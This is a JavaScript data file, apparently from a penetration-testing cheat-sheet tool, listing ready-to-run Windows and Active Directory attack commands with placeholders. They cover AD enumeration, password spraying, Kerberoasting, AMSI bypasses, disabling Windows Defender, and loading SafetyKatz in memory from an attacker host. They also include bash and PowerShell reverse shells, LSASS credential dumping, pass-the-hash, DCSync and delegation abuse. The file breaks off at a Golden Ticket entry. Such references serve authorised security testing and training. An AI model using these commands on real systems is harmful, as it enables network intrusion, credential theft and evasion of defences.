...
const VAR_GROUPS = [
  { name: 'Target',       vars: ['$$IP', '$$DOMAIN', '$$DC', '$$SID', '$$SHARE'] },
...
const TACTIC_TAGS = {
  ...
  'basic-enum':       ['Windows'],
  'ad-enum':          ['Windows', 'Active Directory'],
  ...
  'delegations':      ['Windows', 'Active Directory', 'Kerberos'],
  'lateral-movement': ['Windows', 'Active Directory', 'Kerberos'],
  'adcs':             ['Windows', 'Active Directory', 'Kerberos'],
...
const TACTIC_GROUPS = [
  ...
  },
  {
    ...
    icon: '🏰',
    tacticIds: ['ad-enum', 'delegations', 'adcs', 'lateral-movement'],
  },
  {
    id: 'group-post',
...
const TACTICS = [
  ...
  /* ── 3. AD Enumeration (PowerView) ──────────────────────────────────────── */
  {
    ...
    techniques: [
      {
        id: 'ade-domain',
        name: 'Domain / Forest Info',
        description: 'Gather high-level domain, forest, and trust topology using PowerView.',
        tags: ['active-directory', 'powerview', 'enumeration'],
        commands: [
          { id: 'add1', label: 'Get domain info', os: 'Windows', command: 'Get-Domain', notes: 'Requires PowerView loaded.' },
          { id: 'add2', label: 'Get domain SID', os: 'Windows', command: 'Get-DomainSID', notes: '' },
          { id: 'add3', label: 'Get domain policy', os: 'Windows', command: 'Get-DomainPolicy', notes: 'Password policy, Kerberos settings.' },
          { id: 'add4', label: 'Get domain controllers', os: 'Windows', command: 'Get-DomainController', notes: '' },
          { id: 'add5', label: 'Get forest info', os: 'Windows', command: 'Get-Forest', notes: '' },
          { id: 'add6', label: 'Get forest domains', os: 'Windows', command: 'Get-ForestDomain', notes: '' },
          { id: 'add7', label: 'Get forest trusts', os: 'Windows', command: 'Get-ForestTrust', notes: 'Shows inter-forest trust relationships.' },
          { id: 'add8', label: 'Get domain trusts', os: 'Windows', command: 'Get-DomainTrust', notes: 'Shows domain-level trusts.' },
        ],
      },
      {
        id: 'ade-users',
        name: 'Users, Groups & Computers',
        description: 'Enumerate AD objects — users with interesting attributes, group memberships, computers.',
        tags: ['active-directory', 'powerview', 'enumeration'],
        commands: [
          { id: 'adu1', label: 'All domain users', os: 'Windows', command: 'Get-DomainUser | select SamAccountName,Description,pwdlastset,badpwdcount', notes: '' },
          { id: 'adu2', label: 'Users with SPN (Kerberoastable)', os: 'Windows', command: 'Get-DomainUser -SPN | select SamAccountName,ServicePrincipalName', notes: 'Targets for Kerberoasting.' },
          { id: 'adu3', label: 'Users without preauth (ASREProastable)', os: 'Windows', command: 'Get-DomainUser -PreauthNotRequired | select SamAccountName', notes: 'Targets for AS-REP Roasting.' },
          { id: 'adu4', label: 'All domain groups', os: 'Windows', command: 'Get-DomainGroup | select Name', notes: '' },
          { id: 'adu5', label: 'Members of Domain Admins', os: 'Windows', command: 'Get-DomainGroupMember -Identity "Domain Admins" -Recurse', notes: '' },
          { id: 'adu6', label: 'All computers', os: 'Windows', command: 'Get-DomainComputer | select Name,OperatingSystem', notes: '' },
          { id: 'adu7', label: 'Find local admin access', os: 'Windows', command: 'Find-LocalAdminAccess -Verbose', notes: 'Checks where current user has local admin. Noisy.' },
          { id: 'adu8', label: 'Find domain shares', os: 'Windows', command: 'Find-DomainShare -CheckShareAccess', notes: 'Find readable shares across the domain.' },
          { id: 'adu9', label: 'GPO enumeration', os: 'Windows', command: 'Get-DomainGPO | select DisplayName, gpcfilesyspath', notes: '' },
          { id: 'adu10', label: 'OUs', os: 'Windows', command: 'Get-DomainOU | select Name', notes: '' },
        ],
      },
      {
        id: 'ade-acl',
        name: 'ACL / Privilege Enumeration',
        description: 'Find interesting ACL misconfigurations that can be abused for privilege escalation.',
        tags: ['active-directory', 'acl', 'powerview', 'privesc'],
        commands: [
          { id: 'acl1', label: 'Interesting domain ACLs', os: 'Windows', command: 'Find-InterestingDomainAcl -ResolveGUIDs', notes: 'Finds WriteDACL, GenericAll, etc.' },
          { id: 'acl2', label: 'ACLs on specific object', os: 'Windows', command: 'Get-DomainObjectAcl -Identity $$USER -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"}', notes: '' },
          { id: 'acl3', label: 'DCSync rights', os: 'Windows', command: 'Get-DomainObjectAcl -SearchBase "DC=$$DOMAIN,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match "DS-Replication-Get-Changes") -and ($_.ActiveDirectoryRights -match "ExtendedRight")}', notes: 'Who has DCSync rights.' },
          { id: 'acl4', label: 'Set-DomainObjectOwner', os: 'Windows', command: 'Set-DomainObjectOwner -Identity $$USER -OwnerIdentity attacker', notes: 'Take ownership of an AD object.' },
          { id: 'acl5', label: 'Add-DomainObjectAcl (WriteDACL)', os: 'Windows', command: 'Add-DomainObjectAcl -TargetIdentity $$USER -PrincipalIdentity attacker -Rights All', notes: 'Grant yourself GenericAll.' },
        ],
      },
      {
        id: 'ade-trusts',
        name: 'Trust Enumeration',
        description: 'Map cross-domain and cross-forest trust relationships for lateral movement paths.',
        tags: ['active-directory', 'trusts', 'cross-domain'],
        commands: [
          { id: 'tr1', label: 'Get all trusts', os: 'Windows', command: 'Get-DomainTrust -API', notes: '' },
          { id: 'tr2', label: 'Get forest trusts', os: 'Windows', command: 'Get-ForestTrust', notes: '' },
          { id: 'tr3', label: 'Map domain trusts', os: 'Windows', command: 'Get-DomainTrustMapping', notes: 'Recursively maps all trust paths.' },
          { id: 'tr4', label: 'External trust', os: 'Windows', command: 'Get-DomainTrust | ? {$_.TrustAttributes -eq "FILTER_SIDS"}', notes: 'Trusts with SID filtering (external trusts).' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: 'Test a single password against many accounts to avoid lockouts.',
        tags: ['spray', 'credentials', 'active-directory'],
        commands: [
          { id: 'spray1', label: 'CME SMB spray', os: 'Linux', command: 'crackmapexec smb $$DC -u users.txt -p $$PASSWORD --continue-on-success', notes: 'Use a season+year password. Beware lockout policy.' },
          { id: 'spray2', label: 'Kerbrute spray', os: 'Linux', command: 'kerbrute passwordspray --dc $$DC -d $$DOMAIN users.txt $$PASSWORD', notes: 'Kerberos-based, stealthier than SMB.' },
        ],
      },
      {
        id: 'ia-asrep',
        name: 'AS-REP Roasting',
        description: 'Request AS-REP tickets for accounts without pre-auth and crack offline.',
        tags: ['kerberos', 'active-directory', 'cracking'],
        commands: [
          { id: 'asrep1', label: 'GetNPUsers (no creds)', os: 'Linux', command: 'GetNPUsers.py $$DOMAIN/ -usersfile users.txt -no-pass -dc-ip $$DC', notes: 'Outputs crackable hashes.' },
          { id: 'asrep2', label: 'GetNPUsers (with creds)', os: 'Linux', command: 'GetNPUsers.py $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC -request', notes: '' },
          { id: 'asrep3', label: 'Get-ASREPHash (PowerView)', os: 'Windows', command: 'Get-ASREPHash -UserName $$USER -Verbose', notes: 'PowerView-based AS-REP hash retrieval.' },
          { id: 'asrep4', label: 'Invoke-ASREPRoast', os: 'Windows', command: 'Invoke-ASREPRoast | select -ExpandProperty Hash | Out-File asrep-hashes.txt', notes: '' },
          { id: 'asrep5', label: 'Disable pre-auth (Set-DomainObject)', os: 'Windows', command: 'Set-DomainObject -Identity $$USER -XOR @{UserAccountControl=4194304} -Verbose', notes: 'Abuses GenericAll/GenericWrite to disable pre-auth.' },
          { id: 'asrep6', label: 'Crack AS-REP hash', os: 'Linux', command: 'hashcat -m 18200 asrep.txt $$WORDLIST --force', notes: 'Mode 18200 = Kerberos 5 AS-REP etype 23.' },
        ],
      },
      {
        id: 'ia-kerberoast',
        name: 'Kerberoasting',
        description: 'Request service tickets for SPN accounts and crack their NTLM hashes offline.',
        tags: ['kerberos', 'active-directory', 'cracking'],
        commands: [
          { id: 'krbr1', label: 'GetUserSPNs (impacket)', os: 'Linux', command: 'GetUserSPNs.py $$DOMAIN/$$USER:$$PASSWORD -dc-ip $$DC -request', notes: 'Outputs TGS hashes for cracking.' },
          { id: 'krbr2', label: 'Rubeus kerberoast', os: 'Windows', command: 'Rubeus.exe kerberoast /outfile:tgs.txt', notes: 'Run on domain-joined host.' },
          { id: 'krbr3', label: 'Rubeus /rc4opsec (stealth)', os: 'Windows', command: 'Rubeus.exe kerberoast /rc4opsec /outfile:tgs.txt', notes: '/rc4opsec only targets accounts that support RC4 — reduces noise.' },
          { id: 'krbr4', label: 'Crack TGS hash (hashcat)', os: 'Linux', command: 'hashcat -m 13100 tgs.txt $$WORDLIST', notes: 'Mode 13100 = Kerberos 5 TGS-REP etype 23.' },
          { id: 'krbr5', label: 'Crack TGS hash (john)', os: 'Linux', command: 'john --wordlist=$$WORDLIST tgs.txt', notes: 'John auto-detects the hash format.' },
          { id: 'krbr6', label: 'Set SPN on user (abuse)', os: 'Windows', command: 'Set-DomainObject -Identity $$USER -Set @{serviceprincipalname="nonexistent/BLAHBLAH"} -Verbose', notes: 'Requires GenericAll/GenericWrite on the account.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        id: 'de-amsi',
        name: 'AMSI Bypass',
        description: 'Disable or patch AMSI to allow unsigned/malicious PowerShell to run.',
        tags: ['amsi', 'windows', 'bypass', 'powershell'],
        commands: [
          { id: 'amsi1', label: 'Patch amsiInitFailed (reflection)', os: 'Windows', command: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)', notes: 'One-liner AMSI disable via reflection.' },
          { id: 'amsi2', label: 'Patch amsiContext (memory patch)', os: 'Windows', command: '$a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");$b=$a.GetField("amsiInitFailed","NonPublic,Static");$b.SetValue($null,$true)', notes: 'Same effect, split for clarity.' },
          { id: 'amsi3', label: 'AMSITrigger scan', os: 'Windows', command: 'AmsiTrigger_x64.exe -i C:\path\to\script.ps1 -f 2', notes: 'Find which strings in your script trigger AMSI.' },
          { id: 'amsi4', label: 'Check AMSI providers', os: 'Windows', command: 'reg query HKLM\SOFTWARE\Microsoft\AMSI\Providers', notes: 'Identify active AMSI providers.' },
        ],
      },
      {
        id: 'de-invisishell',
        name: 'Invisi-Shell',
        description: 'Bypass PowerShell logging (ScriptBlock, Module, Transcription) using Invisi-Shell.',
        tags: ['powershell', 'logging', 'bypass', 'windows'],
        commands: [
          { id: 'inv1', label: 'Run (non-admin)', os: 'Windows', command: 'RunWithRegistryNonAdmin.bat', notes: 'Injects hooks to disable logging. No admin needed.' },
          { id: 'inv2', label: 'Run (admin path)', os: 'Windows', command: 'RunWithPathAsAdmin.bat', notes: 'Admin variant using PATH tricks.' },
          { id: 'inv3', label: 'Check logging status', os: 'Windows', command: 'reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell /s', notes: 'Verify ScriptBlockLogging, ModuleLogging settings.' },
        ],
      },
      {
        id: 'de-netloader',
        name: 'NetLoader',
        description: 'Load .NET tools from a URL or UNC path in memory, bypassing disk-based AV detection.',
        tags: ['windows', 'loader', 'evasion', 'memory'],
        commands: [
          { id: 'nl1', label: 'Load tool from HTTP', os: 'Windows', command: 'C:\Users\Public\Loader.exe -path http://$$LHOST/SafetyKatz.exe', notes: 'Fetches and executes in memory via NetLoader.' },
          { id: 'nl2', label: 'Load with args', os: 'Windows', command: 'C:\Users\Public\Loader.exe -path http://$$LHOST/SafetyKatz.exe -args "sekurlsa::ekeys exit"', notes: 'Pass arguments to the in-memory tool.' },
          { id: 'nl3', label: 'Load via UNC', os: 'Windows', command: 'C:\Users\Public\Loader.exe -path \\$$LHOST\share\SafetyKatz.exe', notes: 'Serve over SMB instead of HTTP.' },
        ],
      },
      {
        id: 'de-defender',
        name: 'Defender Disable / Exclusions',
        description: 'Disable or add exclusions to Windows Defender to allow tool execution.',
        tags: ['windows', 'defender', 'av', 'evasion'],
        commands: [
          { id: 'def1', label: 'Disable real-time protection', os: 'Windows', command: 'Set-MpPreference -DisableRealtimeMonitoring $true', notes: 'Requires local admin.' },
          { id: 'def2', label: 'Disable IOAV (download scanning)', os: 'Windows', command: 'Set-MpPreference -DisableIOAVProtection $true', notes: '' },
          { id: 'def3', label: 'Add exclusion path', os: 'Windows', command: 'Add-MpPreference -ExclusionPath "C:\Temp\"', notes: 'Drop tools into excluded directory.' },
          { id: 'def4', label: 'Add process exclusion', os: 'Windows', command: 'Add-MpPreference -ExclusionProcess "powershell.exe"', notes: 'Exclude a process from scanning.' },
          { id: 'def5', label: 'Disable via registry', os: 'Windows', command: 'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', notes: 'Persistent disable via policy key.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: 'Execute commands remotely via SMB using valid credentials or hash.',
        tags: ['smb', 'lateral-movement', 'windows'],
        commands: [
          { id: 'psex1', label: 'psexec.py (creds)', os: 'Linux', command: 'psexec.py $$DOMAIN/$$USER:$$PASSWORD@$$IP', notes: 'Interactive shell via SMB.' },
          { id: 'psex2', label: 'psexec.py (hash)', os: 'Linux', command: 'psexec.py $$DOMAIN/$$USER@$$IP -hashes :$$HASH', notes: 'Pass-the-hash execution.' },
          { id: 'psex3', label: 'CME exec', os: 'Linux', command: 'crackmapexec smb $$IP -u $$USER -p $$PASSWORD -x "whoami /all"', notes: '' },
        ],
      },
      {
        id: 'exec-winrm',
        name: 'WinRM Execution',
        description: 'Gain a PowerShell session via WinRM (port 5985/5986).',
        tags: ['winrm', 'windows', 'powershell'],
        commands: [
          { id: 'winrm1', label: 'evil-winrm (creds)', os: 'Linux', command: 'evil-winrm -i $$IP -u $$USER -p $$PASSWORD', notes: '' },
          { id: 'winrm2', label: 'evil-winrm (hash)', os: 'Linux', command: 'evil-winrm -i $$IP -u $$USER -H $$HASH', notes: 'Pass-the-hash via WinRM.' },
          { id: 'winrm3', label: 'Check WinRM access (CME)', os: 'Linux', command: 'crackmapexec winrm $$IP -u $$USER -p $$PASSWORD', notes: 'Verify access before connecting.' },
          { id: 'winrm4', label: 'New-PSSession', os: 'Windows', command: '$sess = New-PSSession -ComputerName $$IP -Credential (Get-Credential $$USER)', notes: 'Create persistent PS remoting session.' },
          { id: 'winrm5', label: 'Invoke-Command', os: 'Windows', command: 'Invoke-Command -ComputerName $$IP -ScriptBlock {whoami; hostname}', notes: 'One-shot remote command execution.' },
          { id: 'winrm6', label: 'Enter-PSSession', os: 'Windows', command: 'Enter-PSSession -ComputerName $$IP -Credential $$USER', notes: 'Interactive PS remoting shell.' },
          { id: 'winrm7', label: 'winrs (cmd)', os: 'Windows', command: 'winrs -r:$$IP cmd', notes: 'Low-level WinRM shell, no PS required.' },
          { id: 'winrm8', label: 'Invoke-Command via session', os: 'Windows', command: 'Invoke-Command -Session $sess -ScriptBlock {Get-Process}', notes: 'Run commands against existing $sess.' },
        ],
      },
      {
        id: 'exec-revshell',
        name: 'Reverse Shell',
        description: 'Establish a reverse shell callback from the target to the attacker.',
        tags: ['shell', 'linux', 'windows'],
        commands: [
          { id: 'rev1', label: 'Listener (nc)', os: 'Linux', command: 'nc -lvnp $$LPORT', notes: 'Start listener before triggering shell.' },
          { id: 'rev2', label: 'Bash rev shell', os: 'Linux', command: 'bash -c "bash -i >& /dev/tcp/$$LHOST/$$LPORT 0>&1"', notes: 'Run on target.' },
          { id: 'rev3', label: 'PowerShell rev shell', os: 'Windows', command: 'powershell -nop -c "$client=New-Object Net.Sockets.TCPClient(\'$$LHOST\',$$LPORT);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)}"', notes: '' },
          { id: 'rev4', label: 'Upgrade shell (pty)', os: 'Linux', command: 'python3 -c "import pty;pty.spawn(\'/bin/bash\')"', notes: 'Then: Ctrl+Z, stty raw -echo; fg' },
        ],
      },
    ],
  },
  ...
  /* ── 7. Privilege Escalation ─────────────────────────────────────────────── */
  {
    ...
    techniques: [
      {
        id: 'privesc-powerup',
        name: 'PowerUp (Windows Local PrivEsc)',
        description: 'Automated Windows local privilege escalation checks using PowerUp.',
        tags: ['windows', 'powershell', 'privesc', 'local'],
        commands: [
          { id: 'pu1', label: 'Invoke-AllChecks', os: 'Windows', command: 'Import-Module PowerUp.ps1; Invoke-AllChecks', notes: 'Runs all PrivEsc checks. Best first step.' },
          { id: 'pu2', label: 'Get-ServiceUnquoted', os: 'Windows', command: 'Get-ServiceUnquoted -Verbose', notes: 'Find unquoted service paths with spaces.' },
          { id: 'pu3', label: 'Get-ModifiableServiceFile', os: 'Windows', command: 'Get-ModifiableServiceFile -Verbose', notes: 'Services where we can replace the binary.' },
          { id: 'pu4', label: 'Get-ModifiableService', os: 'Windows', command: 'Get-ModifiableService -Verbose', notes: 'Services we can modify the configuration of.' },
          { id: 'pu5', label: 'Invoke-ServiceAbuse', os: 'Windows', command: 'Invoke-ServiceAbuse -Name "$$SERVICE" -UserName "$$DOMAIN\$$USER"', notes: 'Abuse a vulnerable service to add a user to local admins.' },
          { id: 'pu6', label: 'Write-UserAddMSI', os: 'Windows', command: 'Write-UserAddMSI', notes: 'Create an MSI that adds a user — use if AlwaysInstallElevated is set.' },
        ],
      },
      {
        id: 'privesc-sudo',
        name: 'Sudo Abuse (Linux)',
        description: 'Exploit misconfigured sudo rules to escalate to root.',
        tags: ['linux', 'sudo', 'privesc'],
        commands: [
          { id: 'sud1', label: 'List sudo rights', os: 'Linux', command: 'sudo -l', notes: 'Check what the current user can sudo.' },
          { id: 'sud2', label: 'GTFO sudo binary', os: 'Linux', command: 'sudo <binary>', notes: 'Check GTFOBins for the specific binary found in sudo -l.' },
        ],
      },
      {
        id: 'privesc-suid',
        name: 'SUID Binary Abuse (Linux)',
        description: 'Find SUID binaries and exploit them to escalate privileges.',
        tags: ['linux', 'suid', 'privesc'],
        commands: [
          { id: 'suid1', label: 'Find SUID files', os: 'Linux', command: 'find / -perm -4000 -type f 2>/dev/null', notes: 'Cross-reference results with GTFOBins.' },
          { id: 'suid2', label: 'Find world-writable', os: 'Linux', command: 'find / -writable -type f 2>/dev/null | grep -v proc', notes: '' },
        ],
      },
      {
        id: 'privesc-token',
        name: 'Token Impersonation (Windows)',
        description: 'Abuse SeImpersonatePrivilege to escalate to SYSTEM.',
        tags: ['windows', 'token', 'privesc'],
        commands: [
          { id: 'tok1', label: 'Check privileges', os: 'Windows', command: 'whoami /priv', notes: 'Look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.' },
          { id: 'tok2', label: 'PrintSpoofer', os: 'Windows', command: 'PrintSpoofer.exe -i -c cmd', notes: 'Works on Windows 10 and Server 2019.' },
          { id: 'tok3', label: 'GodPotato', os: 'Windows', command: 'GodPotato.exe -cmd "cmd /c whoami"', notes: 'Works on Windows 2012–2022.' },
          { id: 'tok4', label: 'RoguePotato', os: 'Windows', command: 'RoguePotato.exe -r $$LHOST -e "cmd.exe"', notes: 'Requires a relay on the attacker side.' },
        ],
      },
      {
        id: 'privesc-dcsync',
        name: 'DCSync',
        description: 'Abuse DS-Replication-Get-Changes-All rights to dump all domain hashes.',
        tags: ['active-directory', 'credential-access', 'domain-admin'],
        commands: [
          { id: 'dcs1', label: 'secretsdump DCSync', os: 'Linux', command: 'secretsdump.py $$DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Dumps all NTDS hashes.' },
          { id: 'dcs2', label: 'Mimikatz DCSync all', os: 'Windows', command: 'mimikatz # lsadump::dcsync /domain:$$DOMAIN /all /csv', notes: '' },
          { id: 'dcs3', label: 'DCSync single user', os: 'Linux', command: 'secretsdump.py -just-dc-user Administrator $$DOMAIN/$$USER:$$PASSWORD@$$DC', notes: 'Target the Administrator account.' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        id: 'cred-lsass',
        name: 'Dump LSASS',
        description: 'Extract plaintext passwords and hashes from LSASS memory using various tools.',
        tags: ['windows', 'lsass', 'credentials'],
        commands: [
          { id: 'lsass1', label: 'Mimikatz sekurlsa', os: 'Windows', command: 'mimikatz # privilege::debug\nmimikatz # sekurlsa::logonpasswords', notes: 'Requires SeDebugPrivilege (local admin+).' },
          { id: 'lsass2', label: 'SafetyKatz', os: 'Windows', command: 'SafetyKatz.exe "sekurlsa::logonpasswords" "exit"', notes: 'Mimikatz compiled to avoid common signatures.' },
          { id: 'lsass3', label: 'SharpKatz', os: 'Windows', command: 'SharpKatz.exe --Command logonpasswords', notes: 'C# port of Mimikatz logonpasswords.' },
          { id: 'lsass4', label: 'Dumpert (direct syscalls)', os: 'Windows', command: 'Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "sekurlsa::logonpasswords"', notes: 'Uses direct syscalls to avoid EDR hooks.' },
          { id: 'lsass5', label: 'comsvcs MiniDump', os: 'Windows', command: 'rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump (Get-Process lsass).id C:\Windows\Temp\lsass.dmp full', notes: 'Creates dump file for offline parsing.' },
          { id: 'lsass6', label: 'pypykatz (parse dump)', os: 'Linux', command: 'pypykatz lsa minidump lsass.dmp', notes: 'Parse lsass.dmp on Linux.' },
          { id: 'lsass7', label: 'pypykatz (remote SMB)', os: 'Linux', command: 'pypykatz live lsa', notes: 'Remote LSASS parse via SMB if available.' },
          { id: 'lsass8', label: 'Mimikatz ekeys (AES)', os: 'Windows', command: 'mimikatz # sekurlsa::ekeys', notes: 'Dumps AES keys for Kerberos — needed for Overpass-the-Hash.' },
        ],
      },
      {
        id: 'cred-opth',
        name: 'Overpass-the-Hash (OPTH)',
        description: 'Use NTLM hash to request a Kerberos TGT — get a full Kerberos session from a hash.',
        tags: ['pth', 'kerberos', 'ntlm', 'windows'],
        commands: [
          { id: 'opth1', label: 'Mimikatz sekurlsa pth', os: 'Windows', command: 'mimikatz # sekurlsa::pth /user:$$USER /domain:$$DOMAIN /ntlm:$$HASH /run:powershell.exe', notes: 'Opens a new PS window with the hash injected.' },
          { id: 'opth2', label: 'SafetyKatz pth', os: 'Windows', command: 'SafetyKatz.exe "sekurlsa::pth /user:$$USER /domain:$$DOMAIN /ntlm:$$HASH /run:powershell.exe" "exit"', notes: 'Less detected variant of the same technique.' },
          { id: 'opth3', label: 'Rubeus /opsec (with createnetonly)', os: 'Windows', command: 'Rubeus.exe asktgt /user:$$USER /rc4:$$HASH /domain:$$DOMAIN /opsec /createnetonly:C:\Windows\System32\cmd.exe', notes: '/opsec uses AES, /createnetonly creates sacrificial process.' },
          { id: 'opth4', label: 'Rubeus PTT from hash', os: 'Windows', command: 'Rubeus.exe asktgt /user:$$USER /rc4:$$HASH /domain:$$DOMAIN /ptt', notes: 'Request TGT and inject into current session.' },
        ],
      },
      {
        id: 'cred-pth',
        name: 'Pass-the-Hash',
        description: 'Authenticate using an NTLM hash without knowing the plaintext password.',
        tags: ['pth', 'ntlm', 'windows'],
        commands: [
          { id: 'pth1', label: 'CME PTH check', os: 'Linux', command: 'crackmapexec smb $$IP -u $$USER -H $$HASH', notes: 'Verifies hash works across the network.' },
          { id: 'pth2', label: 'wmiexec PTH', os: 'Linux', command: 'wmiexec.py -hashes :$$HASH $$DOMAIN/$$USER@$$IP', notes: 'WMI shell via hash.' },
          { id: 'pth3', label: 'smbclient PTH', os: 'Linux', command: 'smbclient //$$IP/$$SHARE -U $$USER%$$HASH --pw-nt-hash', notes: '' },
        ],
      },
      {
        id: 'cred-hashcrack',
        name: 'Hash Cracking',
        description: 'Crack captured hashes offline using wordlists and rules.',
        tags: ['cracking', 'hashcat', 'john'],
        commands: [
          { id: 'hc1', label: 'Hashcat NTLM', os: 'Linux', command: 'hashcat -m 1000 hashes.txt $$WORDLIST', notes: '' },
          { id: 'hc2', label: 'Hashcat NTLM + rules', os: 'Linux', command: 'hashcat -m 1000 hashes.txt $$WORDLIST -r /usr/share/hashcat/rules/best64.rule', notes: 'Increases coverage significantly.' },
          { id: 'hc3', label: 'John the Ripper', os: 'Linux', command: 'john --wordlist=$$WORDLIST hashes.txt', notes: '' },
          { id: 'hc4', label: 'Identify hash type', os: 'Linux', command: 'hashid $$HASH', notes: 'Helps determine hashcat -m value.' },
        ],
      },
    ],
  },
  ...
  /* ── 9. Delegations ──────────────────────────────────────────────────────── */
  {
    ...
    techniques: [
      {
        id: 'deleg-unconstrained',
        name: 'Unconstrained Delegation',
        description: 'Computers with unconstrained delegation cache TGTs of connecting users. Combine with the Printer Bug to coerce DC authentication.',
        tags: ['kerberos', 'delegation', 'active-directory', 'printer-bug'],
        commands: [
          { id: 'unc1', label: 'Find unconstrained computers', os: 'Windows', command: 'Get-DomainComputer -Unconstrained | select Name,UserAccountControl', notes: 'TrustedForDelegation flag set.' },
          { id: 'unc2', label: 'Rubeus monitor for TGTs', os: 'Windows', command: 'Rubeus.exe monitor /interval:5 /nowrap', notes: 'Run on the unconstrained host, watch for incoming TGTs.' },
          { id: 'unc3', label: 'Printer Bug (MS-RPRN)', os: 'Windows', command: 'MS-RPRN.exe \\$$DC \\$$IP', notes: 'Coerce DC to authenticate to the unconstrained host. Run from unconstrained machine.' },
          { id: 'unc4', label: 'SpoolSample', os: 'Windows', command: 'SpoolSample.exe $$DC $$IP', notes: 'Alternative printer bug tool.' },
          { id: 'unc5', label: 'PTT with captured TGT', os: 'Windows', command: 'Rubeus.exe ptt /ticket:$$TICKET', notes: 'Inject the captured DC TGT.' },
          { id: 'unc6', label: 'DCSync after TGT inject', os: 'Windows', command: 'mimikatz # lsadump::dcsync /user:$$DOMAIN\krbtgt', notes: '' },
        ],
      },
      {
        id: 'deleg-constrained',
        name: 'Constrained Delegation',
        description: 'Abuse accounts with constrained delegation (TrustedToAuthForDelegation) to impersonate any user to specific services.',
        tags: ['kerberos', 'delegation', 'active-directory', 's4u'],
        commands: [
          { id: 'con1', label: 'Find user accounts with constrained delegation', os: 'Windows', command: 'Get-DomainUser -TrustedToAuth | select SamAccountName,msds-allowedtodelegateto', notes: '' },
          { id: 'con2', label: 'Find computer accounts with constrained delegation', os: 'Windows', command: 'Get-DomainComputer -TrustedToAuth | select Name,msds-allowedtodelegateto', notes: '' },
          { id: 'con3', label: 'Rubeus S4U (user account)', os: 'Windows', command: 'Rubeus.exe s4u /user:$$USER /rc4:$$HASH /impersonateuser:Administrator /msdsspn:cifs/$$DC /ptt', notes: 'Full S4U2Self + S4U2Proxy chain.' },
          { id: 'con4', label: 'Rubeus S4U (alternate service)', os: 'Windows', command: 'Rubeus.exe s4u /user:$$USER /rc4:$$HASH /impersonateuser:Administrator /msdsspn:cifs/$$DC /altservice:ldap /ptt', notes: '/altservice swaps service name for DCSync-usable ticket.' },
          { id: 'con5', label: 'kekeo S4U', os: 'Windows', command: 'kekeo # tgt::ask /user:$$USER /domain:$$DOMAIN /rc4:$$HASH\nkekeo # tgs::s4u /tgt:TGT.kirbi /user:Administrator@$$DOMAIN /service:cifs/$$DC', notes: 'Alternative to Rubeus using kekeo.' },
        ],
      },
      {
        id: 'deleg-rbcd',
        name: 'Resource-Based Constrained Delegation (RBCD)',
        description: 'Configure msDS-AllowedToActOnBehalfOfOtherIdentity on a target to delegate to a computer we control.',
        tags: ['kerberos', 'rbcd', 'active-directory', 'powermad'],
        commands: [
          { id: 'rbcd1', label: 'Create fake machine account (Powermad)', os: 'Windows', command: 'New-MachineAccount -MachineAccount attackerpc -Password (ConvertTo-SecureString "P@ssword1" -AsPlainText -Force) -Verbose', notes: 'Requires MachineAccountQuota > 0 (default is 10).' },
          { id: 'rbcd2', label: 'Get SID of new machine', os: 'Windows', command: 'Get-DomainComputer -Identity attackerpc | select objectsid', notes: '' },
          { id: 'rbcd3', label: 'Set RBCD on target', os: 'Windows', command: '$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<attackerpc-SID>)"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nGet-DomainComputer -Identity $$IP | Set-DomainObject -Set @{\'msds-allowedtoactonbehalfofotheridentity\'=$SDBytes} -Verbose', notes: 'Write RBCD attribute on target computer.' },
          { id: 'rbcd4', label: 'Rubeus S4U RBCD', os: 'Windows', command: 'Rubeus.exe s4u /user:attackerpc$ /rc4:$$HASH /impersonateuser:Administrator /msdsspn:cifs/$$IP /ptt', notes: '$$HASH = NTLM of attackerpc$ machine account.' },
          { id: 'rbcd5', label: 'Verify RBCD attribute', os: 'Windows', command: 'Get-DomainComputer $$IP | select msds-allowedtoactonbehalfofotheridentity', notes: '' },
        ],
      },
    ],
  },
    ...
    techniques: [
      {
        ...
        description: 'Inject a Kerberos ticket into the current session to authenticate as another user.',
        tags: ['kerberos', 'active-directory', 'ptt'],
        commands: [
          { id: 'ptt1', label: 'Request TGT (creds)', os: 'Linux', command: 'getTGT.py $$DOMAIN/$$USER:$$PASSWORD && export KRB5CCNAME=$$USER.ccache', notes: '' },
          { id: 'ptt2', label: 'Request TGT (hash)', os: 'Linux', command: 'getTGT.py $$DOMAIN/$$USER -hashes :$$HASH && export KRB5CCNAME=$$USER.ccache', notes: '' },
          { id: 'ptt3', label: 'Use ticket with CME', os: 'Linux', command: 'crackmapexec smb $$DC -k --use-kcache', notes: 'Requires KRB5CCNAME set.' },
          { id: 'ptt4', label: 'Rubeus PTT (Windows)', os: 'Windows', command: 'Rubeus.exe ptt /ticket:$$TICKET', notes: 'Injects ticket into current logon session.' },
        ],
      },
      {
        id: 'lat-golden',
        name: 'Golden Ticket',
        description: 'Forge a TGT using the KRBTGT hash to gain persistent DA-level access.',
